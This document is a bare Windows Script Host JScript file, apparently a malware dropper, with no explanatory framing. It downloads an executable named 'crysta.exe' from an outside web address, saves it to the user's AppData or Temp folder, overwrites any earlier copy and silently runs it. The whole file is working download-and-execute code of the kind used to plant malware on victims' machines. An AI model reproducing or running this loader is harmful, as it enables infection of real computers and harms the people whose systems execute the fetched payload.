var installdir = "%appdata%";
var fileurl = "https://metrodocs.org/crysta.exe";
var filename = "crysta.exe"

var shellobj = WScript.createObject("wscript.shell");
var filesystemobj = WScript.createObject("scripting.filesystemobject");

installdir = shellobj.ExpandEnvironmentStrings(installdir) + "\\";
if(!filesystemobj.folderExists(installdir))
{  
	installdir = shellobj.ExpandEnvironmentStrings("%temp%") + "\\";
}


function sitedownloader (fileurl,filename)
{

    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.serverxmlhttp" );
    objhttpdownload.open("get", strlink, false);
    //objhttpdownload.setRequestHeader("cache-control", "max-age=0");
    objhttpdownload.send();
    
    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if(objfsodownload.fileExists(strsaveto))
	{
        objfsodownload.deleteFile(strsaveto);
    }
     
    if (objhttpdownload.status == 200)
	{
        var  objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1; 
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();
        
        objstreamdownload = null;
     }
     if(objfsodownload.fileExists(strsaveto))
	 {
        shellobj.run(objfsodownload.getFile(strsaveto).shortPath);
     }
}

sitedownloader(fileurl,filename);